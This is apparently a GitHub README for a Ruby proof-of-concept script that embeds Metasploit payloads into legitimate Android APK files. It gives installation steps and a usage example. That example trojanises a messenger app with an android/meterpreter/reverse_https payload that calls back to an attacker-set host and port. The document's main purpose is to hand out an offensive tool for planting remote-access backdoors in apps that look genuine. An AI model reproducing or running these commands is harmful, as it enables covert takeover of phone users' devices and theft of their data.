# **Use it on your own risk**
Embed a Metasploit Payload in an Original .Apk File
<br />
> I choose a lazy person to do a hard job. Because a lazy person will find an easy way to do it.
 
  — [Bill Gates](http://www.goodreads.com/quotes/568877-i-choose-a-lazy-person-to-do-a-hard-job)
 
**This script is a POC for injecting metasploit payloads on arbitrary APKs

**Authored by timwr, Jack64 , developed by [xC0d3rZ](https://xc0d3rz.github.io/whoaim)**
###Installation
```bash
 gem install bundler
 bundler install
``` 
###Requirements 
 
 1. Ruby (**> 1.8.7**).

###Warring 
Don't edit or remove **embed_tools** folder and **tmp/*** folder until script finish Embedding.

###Usage
```bash
./run [target.apk] [msfvenom options]
```
<br>
e.g
```bash
./run messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443
```

